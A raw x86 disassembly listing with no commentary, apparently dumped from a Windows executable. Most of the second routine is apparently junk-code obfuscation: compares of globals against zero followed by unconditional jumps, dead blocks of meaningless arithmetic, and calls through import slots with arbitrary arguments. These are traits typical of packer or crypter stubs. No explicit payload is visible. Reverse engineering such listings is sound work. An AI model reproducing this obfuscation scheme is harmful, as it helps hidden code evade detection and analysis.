  41f788:	mov    eax,DWORD PTR [esp+0x68]
  41f78c:	mov    ecx,edx
  41f78e:	cdq    
  41f78f:	shld   edx,eax,0x2
  41f793:	shr    ecx,0x1e
  41f796:	xor    edi,edi
  41f798:	shl    eax,0x2
  41f79b:	or     eax,ecx
  41f79d:	or     edx,edi
  41f79f:	mov    ecx,edx
  41f7a1:	mov    edx,DWORD PTR [esp+0x20]
  41f7a5:	xor    eax,ebx
  41f7a7:	xor    ecx,esi
  41f7a9:	mov    esi,DWORD PTR [esp+0x24]
  41f7ad:	cmp    edx,eax
  41f7af:	jne    0x41f7bd
  41f7b5:	cmp    esi,ecx
  41f7b7:	je     0x41f804
  41f7bd:	push   DWORD PTR ds:0x422358
  41f7c3:	push   DWORD PTR ds:0x4220ec
  41f7c9:	mov    eax,ds:0x422268
  41f7ce:	mov    eax,DWORD PTR [eax+0x1a4]
  41f7d4:	push   DWORD PTR [eax]
  41f7d6:	mov    eax,DWORD PTR [esp+0x6c]
  41f7da:	call   eax
  41f7dc:	mov    ecx,DWORD PTR ds:0x422268
  41f7e2:	mov    ecx,DWORD PTR [ecx+0x1dc]
  41f7e8:	mov    DWORD PTR [ecx],eax
  41f7ea:	mov    eax,ds:0x422268
  41f7ef:	push   0x4
  41f7f1:	add    eax,0x1dc
  41f7f6:	push   eax
  41f7f7:	lea    eax,[esp+0x94]
  41f7fe:	push   eax
  41f7ff:	call   0x41d2e9
  41f804:	mov    eax,DWORD PTR [esp+0x8c]
  41f80b:	mov    eax,DWORD PTR [eax]
  41f80d:	pop    edi
  41f80e:	pop    esi
  41f80f:	pop    ebx
  41f810:	mov    esp,ebp
  41f812:	pop    ebp
  41f813:	ret    0xc
  41f816:	push   ebp
  41f817:	mov    ebp,esp
  41f819:	sub    esp,0x23c
  41f81f:	cmp    DWORD PTR ds:0x4228c2,0x0
  41f826:	mov    DWORD PTR ds:0x42297a,0x7f83
  41f830:	mov    DWORD PTR ds:0x4228d6,0x6307
  41f83a:	movzx  ecx,BYTE PTR ds:0x4228ba
  41f841:	jmp    0x41f8b7
  41f846:	mov    eax,0x73d2
  41f84b:	ja     0x41f897
  41f851:	push   0x7572
  41f856:	push   0x3356
  41f85b:	push   DWORD PTR [ebp-0x18]
  41f85e:	call   DWORD PTR ds:0x42a08c
  41f864:	movzx  ecx,WORD PTR ds:0x4228c6
  41f86b:	sub    DWORD PTR ds:0x42289e,ecx
  41f871:	add    DWORD PTR ds:0x42298a,0x51b4
  41f87b:	xor    DWORD PTR ds:0x4228ae,0x409b
  41f885:	mov    ecx,DWORD PTR ds:0x4229a2
  41f88b:	or     ecx,DWORD PTR ds:0x42293e
  41f891:	mov    DWORD PTR ds:0x4229a2,ecx
  41f897:	sbb    ecx,DWORD PTR ds:0x4229d2
  41f89d:	sbb    DWORD PTR ds:0x422926,0x11d6
  41f8a7:	mov    DWORD PTR ds:0x4228ca,0x27b8
  41f8b1:	sbb    DWORD PTR ds:0x422976,edi
  41f8b7:	push   ebx
  41f8b8:	and    eax,ecx
  41f8ba:	push   esi
  41f8bb:	movzx  ecx,WORD PTR ds:0x42293a
  41f8c2:	and    DWORD PTR ds:0x42292e,ecx
  41f8c8:	push   edi
  41f8c9:	xor    eax,eax
  41f8cb:	mov    DWORD PTR [ebp-0x50],0x1
  41f8d2:	mov    DWORD PTR [ebp-0xbc],0x61a1
  41f8dc:	mov    DWORD PTR [ebp-0xb8],0x1
  41f8e6:	or     eax,0x7a0d
  41f8eb:	mov    ecx,DWORD PTR [ebp-0xb8]
  41f8f1:	cmp    DWORD PTR ds:0x4228aa,0x0
  41f8f8:	mov    DWORD PTR ds:0x4228ea,0x1a45
  41f902:	mov    DWORD PTR ds:0x422906,0x738a
  41f90c:	mov    DWORD PTR ds:0x42290a,edx
  41f912:	mov    DWORD PTR ds:0x42295a,0x6016
  41f91c:	jmp    0x41fa1f
  41f921:	movzx  eax,BYTE PTR ds:0x422986
  41f928:	mov    DWORD PTR ds:0x422976,ecx
  41f92e:	jae    0x41f975
  41f934:	push   DWORD PTR [ebp-0x10]
  41f937:	push   0x88a2
  41f93c:	push   DWORD PTR [ebp-0x14]
  41f93f:	push   0x19f9
  41f944:	push   DWORD PTR [ebp-0x10]
  41f947:	push   0x407d
  41f94c:	push   DWORD PTR [ebp-0x28]
  41f94f:	push   0x5ee1
  41f954:	push   0x7b11
  41f959:	push   DWORD PTR [ebp-0x20]
  41f95c:	push   DWORD PTR [ebp-0x24]
  41f95f:	call   DWORD PTR ds:0x42a1b8
  41f965:	mov    DWORD PTR ds:0x4228ce,0x1a48
  41f96f:	adc    DWORD PTR ds:0x42290a,ebx
  41f975:	adc    DWORD PTR ds:0x422956,0x4228f2
  41f97f:	adc    DWORD PTR ds:0x42296a,0x42288e
  41f989:	cmp    DWORD PTR ds:0x422996,0x0
  41f990:	mov    DWORD PTR ds:0x422926,0x4d3f
  41f99a:	mov    DWORD PTR ds:0x42299a,0x151a
  41f9a4:	mov    DWORD PTR ds:0x422896,0x407
  41f9ae:	mov    DWORD PTR ds:0x422956,0x35c9
  41f9b8:	jmp    0x41fa1f
  41f9bd:	mov    eax,ds:0x42296e
  41f9c2:	jne    0x41f9f9
  41f9c8:	push   DWORD PTR [ebp-0x18]
  41f9cb:	call   DWORD PTR ds:0x42a1bc
  41f9d1:	xor    DWORD PTR ds:0x42292e,0x4228d2
  41f9db:	xor    DWORD PTR ds:0x4229a6,0x7795
  41f9e5:	xor    DWORD PTR ds:0x42296e,0x5b89
  41f9ef:	add    DWORD PTR ds:0x4228a6,0x3dfd
  41f9f9:	sub    DWORD PTR ds:0x42298e,0x1198
  41fa03:	adc    DWORD PTR ds:0x4228ea,0x422902
  41fa0d:	add    DWORD PTR ds:0x4229c6,0x43e7
  41fa17:	xor    DWORD PTR ds:0x422902,ebx
  41fa1d:	neg    eax
  41fa1f:	mov    eax,0x584
  41fa24:	sub    DWORD PTR ds:0x422976,0x422906
  41fa2e:	xor    edx,edx
  41fa30:	div    ecx
  41fa32:	cmp    DWORD PTR ds:0x42288a,0x0
  41fa39:	mov    ecx,0x7438
  41fa3e:	mov    DWORD PTR ds:0x4229a6,0x7ff6
  41fa48:	mov    ecx,0x49e3
  41fa4d:	mov    DWORD PTR ds:0x42296e,0x37ce
  41fa57:	jmp    0x41faa5
  41fa5c:	mov    DWORD PTR ds:0x4228fa,0x7ac
  41fa66:	jb     0x41fa93
  41fa6c:	push   0x18bc
  41fa71:	call   DWORD PTR ds:0x42a090
  41fa77:	sbb    DWORD PTR ds:0x4228f2,0xcbd
  41fa81:	sbb    ecx,DWORD PTR ds:0x4228e2
  41fa87:	sub    DWORD PTR ds:0x42299e,ecx
  41fa8d:	and    ecx,DWORD PTR ds:0x4228a6
  41fa93:	or     ecx,0x1fe6
  41fa99:	add    DWORD PTR ds:0x4228f6,ebx
  41fa9f:	adc    ecx,0x2c1d
  41faa5:	imul   eax,eax,0x51d4
  41faab:	cmp    DWORD PTR ds:0x4228a6,0x0
  41fab2:	mov    DWORD PTR ds:0x4228da,ecx
  41fab8:	movzx  ecx,WORD PTR ds:0x42297e
  41fabf:	mov    DWORD PTR ds:0x422962,ebx
  41fac5:	jmp    0x41fb0f
  41faca:	mov    DWORD PTR ds:0x4228e2,edx
  41fad0:	ja     0x41fafd
  41fad6:	push   0x4229a2
  41fadb:	push   DWORD PTR [ebp-0x28]
  41fade:	push   DWORD PTR [ebp-0x20]
  41fae1:	call   DWORD PTR ds:0x42a094
  41fae7:	mov    DWORD PTR ds:0x4228a6,0x230b
  41faf1:	not    DWORD PTR ds:0x422976
  41faf7:	sub    DWORD PTR ds:0x422986,edi
  41fafd:	sub    ecx,DWORD PTR ds:0x422982
  41fb03:	adc    ecx,DWORD PTR ds:0x4229be
  41fb09:	sub    ecx,DWORD PTR ds:0x4228fe
  41fb0f:	mov    ecx,DWORD PTR [ebp-0xbc]
  41fb15:	xor    eax,ecx
  41fb17:	sbb    DWORD PTR ds:0x422892,ebx
  41fb1d:	and    eax,0x4c09
  41fb22:	mov    ecx,DWORD PTR [ebp-0x50]
  41fb25:	and    DWORD PTR ds:0x42296e,0x422982
  41fb2f:	xor    edx,edx
  41fb31:	or     DWORD PTR ds:0x422956,0x4802
  41fb3b:	div    ecx
  41fb3d:	add    DWORD PTR ds:0x4229be,0x5f4b
  41fb47:	sub    eax,0x401
  41fb4c:	mov    ecx,DWORD PTR ds:0x4228de
  41fb52:	xor    DWORD PTR ds:0x422996,ecx
  41fb58:	mov    DWORD PTR [ebp-0x90],eax
  41fb5e:	cmp    DWORD PTR ds:0x4228b6,0x0
  41fb65:	mov    DWORD PTR ds:0x4228e6,edx
  41fb6b:	not    ecx
  41fb6d:	movzx  ecx,WORD PTR ds:0x4228d6
  41fb74:	jmp    0x41fba4
  41fb79:	not    eax
  41fb7b:	jae    0x41fb92
  41fb81:	push   DWORD PTR [ebp-0x10]
  41fb84:	call   DWORD PTR ds:0x42a2d0
  41fb8a:	add    ecx,edx
  41fb8c:	and    edx,0x53dd
  41fb92:	add    DWORD PTR ds:0x42297e,0x1518
  41fb9c:	and    edx,edx
  41fb9e:	neg    DWORD PTR ds:0x422986
  41fba4:	mov    DWORD PTR [ebp-0x8c],0x2ff8
  41fbae:	or     eax,eax
  41fbb0:	mov    DWORD PTR [ebp-0x4c],0x39f7
  41fbb7:	cmp    DWORD PTR ds:0x42298e,0x0
  41fbbe:	mov    DWORD PTR ds:0x422932,0x7de
  41fbc8:	mov    edx,0x2edc
  41fbcd:	mov    DWORD PTR ds:0x422946,ebx
  41fbd3:	jmp    0x41fc3a
  41fbd8:	mov    DWORD PTR ds:0x4228b6,0xeb6
  41fbe2:	mov    ecx,DWORD PTR ds:0x422912
  41fbe8:	ja     0x41fc23
  41fbee:	push   0x8c9b
  41fbf3:	call   DWORD PTR ds:0x42a2d4
  41fbf9:	and    DWORD PTR ds:0x4228aa,0x7f6
  41fc03:	xor    edx,edx
  41fc05:	add    edx,DWORD PTR ds:0x422916
  41fc0b:	add    edx,DWORD PTR ds:0x422922
  41fc11:	mov    DWORD PTR ds:0x422916,edx
  41fc17:	mov    ecx,DWORD PTR ds:0x42297e
  41fc1d:	xor    DWORD PTR ds:0x42294a,ecx
  41fc23:	dec    edx
  41fc24:	sub    DWORD PTR ds:0x422946,0x422986
  41fc2e:	mov    edx,DWORD PTR ds:0x4228aa
  41fc34:	sub    DWORD PTR ds:0x422962,edx
  41fc3a:	mov    DWORD PTR [ebp-0xb4],0x3842
  41fc44:	mov    DWORD PTR ds:0x422906,0x649c
  41fc4e:	mov    eax,DWORD PTR [ebp-0x4c]
  41fc51:	adc    edx,0x487c
  41fc57:	add    eax,DWORD PTR [ebp-0xb4]
  41fc5d:	neg    edx
  41fc5f:	xor    eax,0x2e02
  41fc64:	xor    edx,edx
  41fc66:	xor    eax,0x7294
  41fc6b:	dec    ecx
  41fc6c:	imul   eax,eax,0x68f3
  41fc72:	sub    edx,edx
  41fc74:	mov    ecx,DWORD PTR [ebp-0x8c]
  41fc7a:	and    eax,ecx
  41fc7c:	or     edx,0x18d0
  41fc82:	sub    eax,0x2818
  41fc87:	and    DWORD PTR ds:0x4229aa,0x187b
  41fc91:	mov    DWORD PTR [ebp-0xe8],eax
  41fc97:	mov    DWORD PTR [ebp-0x70],0x6f89
  41fc9e:	cmp    DWORD PTR ds:0x4229ce,0x0
  41fca5:	mov    DWORD PTR ds:0x4228d6,0x3c7
  41fcaf:	mov    DWORD PTR ds:0x422942,edi
  41fcb5:	movzx  edx,BYTE PTR ds:0x4228aa
  41fcbc:	jmp    0x41fd0a
  41fcc1:	mov    DWORD PTR ds:0x422966,ecx
  41fcc7:	jae    0x41fd00
  41fccd:	push   0x8302
  41fcd2:	push   0x7bd4
  41fcd7:	push   0x2714
  41fcdc:	push   DWORD PTR [ebp-0x28]
  41fcdf:	push   0x400000
  41fce4:	call   DWORD PTR ds:0x42a2d8
  41fcea:	add    ecx,0x75a1
  41fcf0:	or     edx,DWORD PTR ds:0x42298e
  41fcf6:	xor    DWORD PTR ds:0x42289e,0x5495
  41fd00:	adc    ecx,edx
  41fd02:	sbb    ecx,DWORD PTR ds:0x422992
  41fd08:	not    edx
  41fd0a:	mov    DWORD PTR [ebp-0xd0],0x5a58
  41fd14:	adc    DWORD PTR ds:0x4228da,0x189a
  41fd1e:	mov    DWORD PTR [ebp-0x120],0x3c77
  41fd28:	cmp    DWORD PTR ds:0x4229d2,0x0
  41fd2f:	mov    DWORD PTR ds:0x422962,0x782b
  41fd39:	mov    edx,0x3512
  41fd3e:	jmp    0x41fd81
  41fd43:	mov    DWORD PTR ds:0x422966,0x45e0
  41fd4d:	mov    DWORD PTR ds:0x42298a,ebx
  41fd53:	jle    0x41fd72
  41fd59:	push   0x4f01
  41fd5e:	call   DWORD PTR ds:0x42a2dc
  41fd64:	or     edx,ecx
  41fd66:	adc    edx,DWORD PTR ds:0x4228fa
  41fd6c:	sub    DWORD PTR ds:0x422956,edi
  41fd72:	dec    ecx
  41fd73:	inc    DWORD PTR ds:0x4228c2
  41fd79:	adc    ecx,ecx
  41fd7b:	sub    edx,0x2d38
  41fd81:	mov    DWORD PTR [ebp-0x2c],0x2129
  41fd88:	movzx  edx,WORD PTR ds:0x42290e
  41fd8f:	sbb    edx,DWORD PTR ds:0x4229a6
  41fd95:	mov    DWORD PTR ds:0x42290e,edx
  41fd9b:	mov    eax,DWORD PTR [ebp-0x2c]
  41fd9e:	imul   eax,eax,0x1ada
  41fda4:	mov    ecx,DWORD PTR [ebp-0x120]
  41fdaa:	and    DWORD PTR ds:0x422892,ebx
  41fdb0:	imul   ecx,ecx,0x53ae
  41fdb6:	sbb    edx,DWORD PTR ds:0x422982
  41fdbc:	imul   ecx,ecx,0x7447
  41fdc2:	mov    edx,DWORD PTR [ebp-0xd0]
  41fdc8:	inc    DWORD PTR ds:0x4228be
  41fdce:	and    ecx,edx
  41fdd0:	sub    edx,DWORD PTR ds:0x4229a6
  41fdd6:	or     ecx,0x2a20
  41fddc:	cmp    DWORD PTR ds:0x4228ba,0x0
  41fde3:	mov    DWORD PTR ds:0x422906,edi
  41fde9:	mov    DWORD PTR ds:0x4229d2,edx
  41fdef:	mov    DWORD PTR ds:0x4228be,edx
  41fdf5:	mov    edx,DWORD PTR ds:0x422956
  41fdfb:	jmp    0x41fe84
  41fe00:	mov    DWORD PTR ds:0x4228ba,0x5711
  41fe0a:	mov    DWORD PTR ds:0x4228ba,edi
  41fe10:	ja     0x41fe4a
  41fe16:	push   0x3098
  41fe1b:	push   0x4227d9
  41fe20:	push   0x4227af
  41fe25:	push   0x4227eb
  41fe2a:	call   DWORD PTR ds:0x42a1c0
  41fe30:	mov    edx,DWORD PTR ds:0x4229ae
  41fe36:	adc    edx,DWORD PTR ds:0x4228c6
  41fe3c:	mov    DWORD PTR ds:0x4229ae,edx
  41fe42:	not    edx
  41fe44:	xor    edx,DWORD PTR ds:0x422996
  41fe4a:	mov    edx,DWORD PTR ds:0x422af2
  41fe50:	mov    edx,DWORD PTR [edx]
  41fe52:	add    DWORD PTR ds:0x422936,edx
  41fe58:	mov    edx,DWORD PTR ds:0x422892
  41fe5e:	and    DWORD PTR ds:0x422976,edx
  41fe64:	movzx  edx,WORD PTR ds:0x4229ae
  41fe6b:	add    DWORD PTR ds:0x4229d2,edx
  41fe71:	movzx  edx,WORD PTR ds:0x4229aa
  41fe78:	xor    edx,DWORD PTR ds:0x42289a
  41fe7e:	mov    DWORD PTR ds:0x4229aa,edx
  41fe84:	mov    edx,DWORD PTR [ebp-0x70]
  41fe87:	xor    ecx,edx
  41fe89:	add    DWORD PTR ds:0x4228ae,0x42293e
  41fe93:	mov    edx,DWORD PTR [ebp+0x14]
  41fe96:	mov    eax,DWORD PTR [edx+eax*1-0x37a66ea]
  41fe9d:	add    DWORD PTR ds:0x422986,0x422936
  41fea7:	lea    eax,[ecx+eax*1-0x45a1]
  41feae:	sub    ecx,0x1147
  41feb4:	mov    DWORD PTR [ebp-0xb0],eax
  41feba:	mov    DWORD PTR [ebp-0x11c],0x303f
  41fec4:	mov    DWORD PTR [ebp-0x98],0x51a9
  41fece:	and    DWORD PTR ds:0x4228ee,0x28c
  41fed8:	mov    DWORD PTR [ebp-0xcc],0x6d4d
  41fee2:	mov    eax,DWORD PTR [ebp-0xcc]
  41fee8:	xor    eax,0x6f65
  41feed:	movzx  ecx,WORD PTR ds:0x42296a
  41fef4:	or     DWORD PTR ds:0x422986,ecx
  41fefa:	mov    ecx,DWORD PTR [ebp-0x98]
  41ff00:	or     eax,ecx
  41ff02:	xor    DWORD PTR ds:0x422922,0x9d1
  41ff0c:	add    eax,0x161e
  41ff11:	mov    ecx,DWORD PTR [ebp-0x11c]
  41ff17:	add    DWORD PTR ds:0x422996,0x5a44
  41ff21:	or     eax,ecx
  41ff23:	and    DWORD PTR ds:0x422922,ebx
  41ff29:	add    eax,0x1cca
  41ff2e:	cmp    DWORD PTR ds:0x422996,0x0
  41ff35:	movzx  ecx,WORD PTR ds:0x4229b6
  41ff3c:	mov    DWORD PTR ds:0x4228ca,ecx
  41ff42:	mov    ecx,0x6e0d
  41ff47:	jmp    0x41ffbb
  41ff4c:	mov    ecx,0x4420
  41ff51:	mov    DWORD PTR ds:0x4228d2,0xbd6
  41ff5b:	jb     0x41ffa5
  41ff61:	push   DWORD PTR [ebp-0x14]
  41ff64:	push   DWORD PTR [ebp-0x24]
  41ff67:	push   0x422797
  41ff6c:	push   0x81c6
  41ff71:	push   0x5863
  41ff76:	push   0x7a14
  41ff7b:	push   DWORD PTR [ebp-0x14]
  41ff7e:	push   0x36c1
  41ff83:	call   DWORD PTR ds:0x42a1c4
  41ff89:	mov    ecx,DWORD PTR ds:0x4229b6
  41ff8f:	add    DWORD PTR ds:0x4228da,ecx
  41ff95:	add    DWORD PTR ds:0x42288e,0x26c4
  41ff9f:	add    ecx,0x5f2e
  41ffa5:	sbb    DWORD PTR ds:0x422972,edi
  41ffab:	add    DWORD PTR ds:0x42289e,edx
  41ffb1:	sbb    DWORD PTR ds:0x4228a2,0x42293e
  41ffbb:	xor    eax,0x96c9
  41ffc0:	mov    DWORD PTR [ebp-0x38],eax
  41ffc3:	mov    DWORD PTR [ebp-0x118],0x6083
  41ffcd:	sbb    ecx,0x49d9
  41ffd3:	mov    DWORD PTR [ebp-0x88],0x556
  41ffdd:	mov    DWORD PTR [ebp-0x140],0x6c7d
  41ffe7:	mov    eax,DWORD PTR [ebp-0x140]
  41ffed:	cmp    DWORD PTR ds:0x42297e,0x0
  41fff4:	mov    DWORD PTR ds:0x4229ba,0x1d24
  41fffe:	mov    ecx,DWORD PTR ds:0x42293e
  420004:	movzx  ecx,WORD PTR ds:0x422986
  42000b:	jmp    0x420047
  420010:	mov    DWORD PTR ds:0x4228be,0x28a1
  42001a:	je     0x42003b
  420020:	push   DWORD PTR [ebp-0x18]
  420023:	call   DWORD PTR ds:0x42a2e0
  420029:	add    DWORD PTR ds:0x4228ce,edi
  42002f:	and    DWORD PTR ds:0x4228ce,ebx
  420035:	add    ecx,0x4241
  42003b:	xor    ecx,0x765e
  420041:	sub    DWORD PTR ds:0x4229d2,edi
  420047:	add    eax,0x5af8
  42004c:	mov    ecx,DWORD PTR [ebp-0x88]
  420052:	xor    DWORD PTR ds:0x4229c2,0x1fa8
  42005c:	sub    eax,ecx
  42005e:	cmp    DWORD PTR ds:0x4229d2,0x0
  420065:	mov    ecx,0x1395
  42006a:	mov    ecx,DWORD PTR ds:0x4228e6
  420070:	mov    DWORD PTR ds:0x4228f2,ebx
  420076:	jmp    0x4200e0
  42007b:	mov    DWORD PTR ds:0x422972,0x6a84
  420085:	mov    DWORD PTR ds:0x4228ea,0x62f2
  42008f:	jb     0x4200b9
  420095:	push   0x3346
  42009a:	call   DWORD PTR ds:0x42a1c8
  4200a0:	add    ecx,0x6b03
  4200a6:	movzx  ecx,WORD PTR ds:0x422912
  4200ad:	add    DWORD PTR ds:0x42288a,ecx
  4200b3:	and    ecx,DWORD PTR ds:0x42292e
  4200b9:	sub    DWORD PTR ds:0x422936,edi
  4200bf:	xor    ecx,ecx
  4200c1:	xor    ecx,DWORD PTR ds:0x422962
  4200c7:	add    ecx,DWORD PTR ds:0x422966
  4200cd:	mov    DWORD PTR ds:0x422962,ecx
  4200d3:	movzx  ecx,WORD PTR ds:0x42290e
  4200da:	or     DWORD PTR ds:0x42294a,ecx
  4200e0:	mov    ecx,DWORD PTR [ebp-0x118]
  4200e6:	xor    DWORD PTR ds:0x4228ca,0x60cf
  4200f0:	lea    eax,[eax+ecx*1+0x68dc]
  4200f7:	not    ecx
  4200f9:	or     eax,0x52f6
  4200fe:	xor    ecx,0x5502
  420104:	sub    eax,0x1dbfe
  420109:	and    DWORD PTR ds:0x4228ee,0x5b35
  420113:	mov    DWORD PTR [ebp-0xac],eax
  420119:	add    DWORD PTR ds:0x422976,0x4861
  420123:	mov    DWORD PTR [ebp-0x6c],0x4b56
  42012a:	mov    DWORD PTR [ebp-0x100],0x49f7
  420134:	mov    eax,DWORD PTR [ebp-0x100]
  42013a:	and    ecx,0x658f
  420140:	add    eax,0x7b60
  420145:	imul   eax,eax,0x5ea
  42014b:	mov    ecx,DWORD PTR [ebp-0x6c]
  42014e:	and    DWORD PTR ds:0x42292e,0x4229c6
  420158:	imul   eax,ecx
  42015b:	xor    edx,edx
  42015d:	and    DWORD PTR ds:0x42299a,ecx
  420163:	mov    ecx,0x3218d
  420168:	div    ecx
  42016a:	adc    DWORD PTR ds:0x42293a,0x4228f2
  420174:	sub    eax,0x24c1
  420179:	cmp    DWORD PTR ds:0x42296e,0x0
  420180:	mov    DWORD PTR ds:0x4228f6,0x5f97
  42018a:	mov    ecx,DWORD PTR ds:0x422992
  420190:	jmp    0x4201dc
  420195:	mov    DWORD PTR ds:0x42290e,0x3c76
  42019f:	not    DWORD PTR ds:0x4228ae
  4201a5:	jbe    0x4201cc
  4201ab:	push   0x3dff
  4201b0:	call   DWORD PTR ds:0x42a098
  4201b6:	not    ecx
  4201b8:	add    DWORD PTR ds:0x4229ca,0x7a9c
  4201c2:	and    DWORD PTR ds:0x422906,0x510
  4201cc:	xor    DWORD PTR ds:0x4228ae,ebx
  4201d2:	adc    DWORD PTR ds:0x422902,0x422986
  4201dc:	mov    DWORD PTR [ebp-0xa8],eax
  4201e2:	cmp    DWORD PTR ds:0x422916,0x0
  4201e9:	mov    ecx,0x7594
  4201ee:	mov    ecx,0x61a
  4201f3:	movzx  ecx,WORD PTR ds:0x4229c6
  4201fa:	jmp    0x420252
  4201ff:	mov    eax,ds:0x42294a
  420204:	mov    DWORD PTR ds:0x4228f6,edi
  42020a:	jbe    0x42023e
  420210:	push   0x1
  420212:	push   0x158d
  420217:	push   DWORD PTR [ebp-0x14]
  42021a:	push   0x1baf
  42021f:	call   DWORD PTR ds:0x42a2e4
  420225:	add    ecx,0x4150
  42022b:	adc    ecx,0x4614
  420231:	movzx  ecx,BYTE PTR ds:0x422892
  420238:	and    DWORD PTR ds:0x4228a2,ecx
  42023e:	sub    ecx,ecx
  420240:	mov    ecx,DWORD PTR ds:0x42289e
  420246:	add    ecx,DWORD PTR ds:0x42298a
  42024c:	mov    DWORD PTR ds:0x42289e,ecx
  420252:	mov    DWORD PTR [ebp-0x84],0x2c40
  42025c:	mov    DWORD PTR [ebp-0x18],0x6013
  420263:	mov    DWORD PTR [ebp-0x80],0xc
  42026a:	xor    ecx,ecx
  42026c:	add    ecx,DWORD PTR ds:0x4228be
  420272:	add    DWORD PTR ds:0x4229ce,ecx
  420278:	mov    eax,DWORD PTR [ebp-0x18]
  42027b:	or     ecx,DWORD PTR ds:0x42296a
  420281:	mov    ecx,DWORD PTR [ebp-0x80]
  420284:	xor    DWORD PTR ds:0x422912,0x4229b6
  42028e:	xor    edx,edx
  420290:	div    ecx
  420292:	sub    ecx,DWORD PTR ds:0x42288a
  420298:	imul   eax,eax,0x4312
  42029e:	cmp    DWORD PTR ds:0x42290a,0x0
  4202a5:	mov    DWORD PTR ds:0x42289a,0x25f4
  4202af:	mov    DWORD PTR ds:0x4228de,0x6ae8
  4202b9:	mov    DWORD PTR ds:0x422936,0x199e
  4202c3:	jmp    0x420396
  4202c8:	mov    DWORD PTR ds:0x4228e6,0x15fd
  4202d2:	jb     0x42030c
  4202d8:	push   0x42293a
  4202dd:	push   0x1346
  4202e2:	push   DWORD PTR [ebp-0x18]
  4202e5:	push   0x747f
  4202ea:	call   DWORD PTR ds:0x42a1cc
  4202f0:	and    ecx,DWORD PTR ds:0x42299a
  4202f6:	mov    ecx,DWORD PTR ds:0x42288a
  4202fc:	xor    DWORD PTR ds:0x4229ca,ecx
  420302:	sbb    DWORD PTR ds:0x422926,0xf78
  42030c:	not    DWORD PTR ds:0x4228ca
  420312:	adc    DWORD PTR ds:0x422972,ebx
  420318:	cmp    DWORD PTR ds:0x4228f2,0x0
  42031f:	mov    DWORD PTR ds:0x4229b2,0x21f7
  420329:	mov    DWORD PTR ds:0x4229a6,ebx
  42032f:	mov    DWORD PTR ds:0x4228aa,0x33dc
  420339:	jmp    0x420396
  42033e:	mov    DWORD PTR ds:0x42288a,0x359f
  420348:	mov    DWORD PTR ds:0x42297a,0x36a8
  420352:	je     0x42037a
  420358:	call   DWORD PTR ds:0x42a2e8
  42035e:	or     ecx,0xc82
  420364:	adc    DWORD PTR ds:0x4229ce,0x7856
  42036e:	neg    DWORD PTR ds:0x4228e6
  420374:	sub    ecx,0x6a4f
  42037a:	or     ecx,DWORD PTR ds:0x42290e
  420380:	adc    ecx,DWORD PTR ds:0x422906
  420386:	xor    DWORD PTR ds:0x42290a,0x3a36
  420390:	adc    ecx,DWORD PTR ds:0x422972
  420396:	add    eax,0x5abe
  42039b:	dec    ecx
  42039c:	mov    ecx,DWORD PTR [ebp-0x84]
  4203a2:	sbb    DWORD PTR ds:0x4228ba,0x6729
  4203ac:	xor    eax,ecx
  4203ae:	movzx  ecx,WORD PTR ds:0x42288e
  4203b5:	sub    ecx,DWORD PTR ds:0x4228ce
  4203bb:	mov    DWORD PTR ds:0x42288e,ecx
  4203c1:	xor    edx,edx
  4203c3:	mov    ecx,0x5ae
  4203c8:	div    ecx
  4203ca:	and    DWORD PTR ds:0x42289e,ebx
  4203d0:	xor    eax,0x5e8c
  4203d5:	mov    DWORD PTR [ebp-0x48],eax
  4203d8:	mov    DWORD PTR ds:0x4228ae,0x2632
  4203e2:	mov    DWORD PTR [ebp-0x13c],0x7b18
  4203ec:	and    eax,DWORD PTR ds:0x42291e
  4203f2:	mov    DWORD PTR [ebp-0x138],0x1169
  4203fc:	xor    eax,ecx
  4203fe:	mov    DWORD PTR [ebp-0x12c],0x1379
  420408:	mov    eax,DWORD PTR [ebp-0x12c]
  42040e:	mov    ecx,0x5856
  420413:	or     DWORD PTR ds:0x422922,0x661e
  42041d:	sub    ecx,eax
  42041f:	dec    eax
  420420:	shr    ecx,0x2
  420423:	sub    ecx,0x5be6
  420429:	cmp    DWORD PTR ds:0x42291e,0x0
  420430:	mov    DWORD PTR ds:0x422906,0x5702
  42043a:	mov    DWORD PTR ds:0x4228b2,0x24ef
  420444:	jmp    0x4204a3
  420449:	mov    eax,ds:0x4228c6
  42044e:	not    DWORD PTR ds:0x42296e
  420454:	jl     0x420487
  42045a:	push   0x5bb1
  42045f:	push   0x4228e2
  420464:	push   0x2dbc
  420469:	call   DWORD PTR ds:0x42a09c
  42046f:	add    DWORD PTR ds:0x422996,edx
  420475:	sub    DWORD PTR ds:0x4228d2,ecx
  42047b:	and    DWORD PTR ds:0x4228ae,ebx
  420481:	adc    DWORD PTR ds:0x42299e,edi
  420487:	adc    DWORD PTR ds:0x4229be,edi
  42048d:	add    DWORD PTR ds:0x42294a,edi
  420493:	add    DWORD PTR ds:0x4228da,0x3429
  42049d:	sub    DWORD PTR ds:0x42296e,ecx
  4204a3:	mov    eax,DWORD PTR [ebp-0x138]
  4204a9:	imul   ecx,eax
  4204ac:	xor    DWORD PTR ds:0x4229aa,ebx
  4204b2:	mov    eax,DWORD PTR [ebp-0x13c]
  4204b8:	xor    DWORD PTR ds:0x42298e,0x5901
  4204c2:	and    ecx,eax
  4204c4:	mov    eax,0x3b18
  4204c9:	and    DWORD PTR ds:0x4228b6,0x42293e
  4204d3:	sub    eax,ecx
  4204d5:	or     DWORD PTR ds:0x4228ee,0x4ab5
  4204df:	mov    DWORD PTR [ebp-0xfc],eax
  4204e5:	mov    ecx,DWORD PTR ds:0x4228aa
  4204eb:	sbb    DWORD PTR ds:0x42288a,ecx
  4204f1:	mov    DWORD PTR [ebp-0x28],0x16d7
  4204f8:	xor    eax,eax
  4204fa:	mov    DWORD PTR [ebp-0x134],0x6b4
  420504:	xor    eax,eax
  420506:	mov    eax,DWORD PTR [ebp-0x134]
  42050c:	add    ecx,DWORD PTR ds:0x42289a
  420512:	or     eax,0x4f70
  420517:	mov    ecx,DWORD PTR [ebp-0x28]
  42051a:	sub    DWORD PTR ds:0x4229ca,0x4228aa
  420524:	or     eax,ecx
  420526:	and    DWORD PTR ds:0x4228ba,ebx
  42052c:	sub    eax,0x5ff7
  420531:	mov    ecx,DWORD PTR ds:0x422a82
  420537:	mov    ecx,DWORD PTR [ecx]
  420539:	adc    DWORD PTR ds:0x42294e,ecx
  42053f:	mov    DWORD PTR [ebp-0xc8],eax
  420545:	mov    DWORD PTR [ebp-0xe4],0x5f39
  42054f:	mov    DWORD PTR [ebp-0xc4],0x6236
  420559:	not    eax
  42055b:	mov    DWORD PTR [ebp-0x7c],0x6ce7
  420562:	or     eax,DWORD PTR ds:0x42289a
  420568:	mov    DWORD PTR [ebp-0x128],0x7537
